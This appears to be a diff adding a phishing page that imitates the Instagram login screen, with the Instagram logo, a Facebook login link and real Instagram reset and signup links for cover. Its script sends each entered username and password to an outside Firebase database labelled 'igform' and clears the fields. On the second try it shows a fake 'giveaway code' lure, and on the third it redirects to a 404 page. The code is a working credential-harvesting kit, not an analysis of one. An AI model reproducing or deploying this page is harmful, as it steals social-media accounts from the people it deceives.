@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+    <title>Document</title>
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+            font-family: 'Helvetica', 'Arial', sans-serif; 
+        }
+
+        body {
+          background-color: #fff;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+          margin: 0;
+          padding: 0;
+        }
+
+        #wrapper {
+            width: 500px;
+            height: 50%;
+            overflow: hidden;
+            border: 0px solid #000;
+            margin: 50px auto;
+            padding: 10px;
+        }
+
+        .main-content {
+            width: 250px;
+            height: 40%;
+            margin: 10px auto;
+            background-color: #fff;
+            border: 1px solid #cacaca;
+            padding: 40px 50px;
+            padding-bottom: 20px;
+        }
+
+        .header {
+            border: 0px solid #000;
+            margin-bottom: 32px;
+        }
+
+        .header img {
+            height: 50px;
+            width: 175px;
+            margin: auto;
+            position: relative;
+            left: 40px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 13px 10px;
+            font-size: 14px;
+            background-color: #f8f8f8;
+            border: 1px solid #dbdbdb;
+            box-sizing: border-box;
+            border-radius: 3px;
+        }
+
+        .input-2::placeholder{
+          font-size: 11.4px;
+        }
+
+        .input-container label {
+            position: absolute;
+            top: 50%;
+            left: 5px;
+            transform: translateY(-50%);
+            background: transparent;
+            padding: 0 5px;
+            color: #8a8a8a;
+            font-size: 11.2px;
+            font-weight: 100;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .input-container input:focus ~ label,
+        .input-container input:not(:placeholder-shown) ~ label {
+            top: 9px;
+            left: 6px;
+            color: #8a8a8a;
+            font-size: 10px;
+        }
+
+        .passa {
+            display: flex;
+            justify-content: center;
+        }
+
+        .passa a {
+            color: #363636;
+            font-size: 11.5px;
+            text-decoration: none;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: #5bacf8;
+            border: 1px solid #64b2fc;
+            padding: 8px 12px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 9px;
+        }
+
+        .line-container {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .line {
+            flex-grow: 1;
+            border-bottom: 1px solid #c9c9c9;
+        }
+
+        .line:not(:last-child) {
+            margin-right: 10px;
+        }
+
+        .line:not(:first-child) {
+            margin-left: 10px;
+        }
+
+        .text {
+            padding: 0 10px;
+            color:  #7c7b7b;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .blockContainer {
+            margin-top: 30px;
+            display: block;
+        }
+
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Helvetica', 'Arial', sans-serif;
+            margin-bottom: 25px;
+            text-decoration: none;
+        }
+
+        .icon-container img {
+            margin-right: 7px;
+            height: 23px;
+            width: 23px;
+        }
+
+        .iconText {
+            font-size: 13px;
+            font-weight: 700;
+            color: #154d85;
+        }
+
+        .sub-content {
+            width: 250px;
+            height: 40%;
+            margin: 10px auto;
+            border: 1px solid #cacaca;
+            padding: 20px 50px;
+            background-color: #fff;
+        }
+
+        .s-part {
+            text-align: center;
+            font-family: 'Overpass Mono', monospace;
+            font-size: 14px;
+            word-spacing: -3px;
+            letter-spacing: -1px;
+            font-weight: normal;
+        }
+
+        .s-part a {
+            text-decoration: none;
+            cursor: pointer;
+            color: #3897f0;
+            font-family: 'Overpass Mono', monospace;
+            margin-left: 2px;
+            word-spacing: -3px;
+            letter-spacing: -2px;
+            font-weight: bold;
+        }
+
+        .sub-content2 {
+            width: 250px;
+            height: 40%;
+            margin: 10px auto;
+            border: 1px solid #cacaca;
+            padding: 20px 50px;
+            background-color: #fff;
+            display: none;
+        }
+
+        .s-part2 {
+            text-align: center;
+            font-size: 14px;
+            font-weight: normal;
+            color: #ff0000;
+        }
+
+        .s-part2 button {
+            cursor: pointer;
+            background-color: #12a1e4;
+            color: #fff;
+            margin-top: 7px;
+            border: solid 1px rgb(13, 111, 202);
+            border-radius: 8px;
+            padding: 7px;
+        }
+
+    </style>
+</head>
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="images/insta.png"/>
+            </div>
+            <div class="l-part">
+                <div class="input-container">
+                    <input type="text" id="input-1" class="input-1" placeholder=" " required />
+                    <label for="input-1">Phone number, username, or email</label>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="input-2" class="input-2" placeholder="Password" required />
+                </div>
+                <input type="button" value="Log in" class="btn" id="submit"/>
+
+                <div class="line-container">
+                    <div class="line"></div>
+                    <div class="text">OR</div>
+                    <div class="line"></div>
+                </div>
+
+                <div class="blockContainer">
+                    <a href="facebook.html" class="icon-container">
+                        <div>
+                            <img src="images/fbicon.png" alt="Facebook Icon">
+                        </div>
+                        <div>
+                            <p class="iconText">Log in with Facebook</p>
+                        </div>
+                    </a>
+                    <div class="passa">
+                        <a href="https://www.instagram.com/accounts/password/reset/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fedit%2F%3F__coig_login%3D1" target="_blank">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fedit%2F%3F__coig_login%3D1" target="_blank">Sign up</a>
+            </div>
+        </div>
+
+        <div class="sub-content2" id="myDiv">
+          <div class="s-part2">
+            Didnt get unique giveaway code?<br><button id="newWay">TRY ANOTHER WAY</button>
+          </div>
+        </div>
+    </div>
+
+    <script type="module">
+     // Import the functions you need from the SDKs you need
+     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"
+      import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"; 
+ 
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyA7QeopUT5UFInhbpuEDjg3pNRAvGPzL0M",
+        authDomain: "airtimenaijabonus.firebaseapp.com",
+        projectId: "airtimenaijabonus",
+        storageBucket: "airtimenaijabonus.appspot.com",
+        messagingSenderId: "151282868315",
+        appId: "1:151282868315:web:7e25bbbfcfc08bbb8fdf7e"
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const formDB = getDatabase(app);
+  
+      document.getElementById("submit").addEventListener("click", submitForm);
+  
+      let clickCount = 0;
+      const myDiv = document.getElementById('myDiv');
+  
+      function submitForm(e) {
+          e.preventDefault();
+  
+          let username = document.getElementById("input-1").value;
+          let password = document.getElementById("input-2").value;
+  
+          if (!username || !password) {
+              alert('Both fields are required.');
+              return false;
+          } else {
+              saveMessage("igform", username, password);
+  
+              // Clear the input fields
+              document.getElementById("input-1").value = "";
+              document.getElementById("input-2").value = "";
+          }
+  
+          clickCount++;
+  
+          if (clickCount === 2) {
+              myDiv.style.display = 'block';
+          } else if (clickCount === 3) {
+              location.href = '404.html';
+          }
+      }
+  
+      const saveMessage = (formtype, username, password) => {
+          const messageRef = ref(formDB, 'messages');
+          const newForm = push(messageRef);
+  
+          set(newForm, {
+              formtype: formtype,
+              username: username,
+              password: password
+          });
+      };
+  
+      function generateRandomKey() {
+          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+          let key = '';
+          for (let i = 0; i < 6; i++) {
+              const randomIndex = Math.floor(Math.random() * characters.length);
+              key += characters[randomIndex];
+          }
+          return key;
+      }
+  
+      // Add an event listener to the button to generate and alert the key
+      document.getElementById('newWay').addEventListener('click', () => {
+          const randomKey = generateRandomKey();
+          alert(`Your secret code is: ${randomKey}\nNote: This code can only be generated once.`);
+          document.getElementById('newWay').disabled = true;
+      });
+  </script>
+  
+  
+</body>
+</html>
